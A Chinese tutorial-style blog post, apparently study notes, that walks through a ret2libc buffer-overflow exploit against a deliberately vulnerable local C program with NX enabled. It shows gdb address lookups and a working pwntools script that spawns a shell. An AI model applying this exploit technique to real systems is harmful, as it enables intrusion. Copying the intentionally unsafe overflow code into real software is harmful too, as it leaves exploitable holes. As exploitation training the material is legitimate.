---
title: 通过ret2libc绕过DEP防护
date: 2018-03-17 19:23:00
tags: PWN

---

## 0x00 前言

看蒸米师傅的一步一步学ROP做的笔记

<!--more-->

0x01 程序源代码：
和第一篇一样

​    

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
vulnerable_function();
write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

编译，依旧关闭stack protecter和ASLR：

```
gcc -fno-stack-protector -o level2 level2.c
```

查看程序的保护机制：

```
mask@mask-virtual-machine:~/mzheng$ gdb ./level2
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./level2...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY: disabled
FORTIFY   : disabled
NX: ENABLED
PIE   : disabled
RELRO : Partial
```

这时候NX是开启的，也就是说我们之前的shellcode在栈中是不能执行的，那么怎样执行shellcode呢？

ldd命令是查看程序包含了哪些库文件

```
mask@mask-virtual-machine:~/mzheng$ ldd level2
	linux-gate.so.1 =>  (0xb7ffe000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e2e000)
	/lib/ld-linux.so.2 (0x80000000)
```

我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。

那么接下来就是获取system()这个函数的地址以及”/bin/sh”这个字符串的地址。

下面是蒸米文章中的原话

> 如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。

```
Breakpoint 1, 0x0804846e in main ()
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f649ab ("/bin/sh")
gdb-peda$ 
```

那么两样都齐全了，开始编写exp：

```
#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10002)

ret = 0xdeadbeef
systemaddr=0xb7e43da0
binshaddr=0xb7f649ab

payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
```

这里因为我们不去执行返回地址处的代码，当然开了NX你也执行不了，所以我们ret就随意写个，凑够字节数即可

运行：

```
mask@mask-virtual-machine:~/mzheng$ vim exp2.py 
mask@mask-virtual-machine:~/mzheng$ python exp2.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './level2': pid 27786
[*] Switching to interactive mode
$ whoami
mask
$ id
uid=1000(mask) gid=1000(mask) 组=1000(mask),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```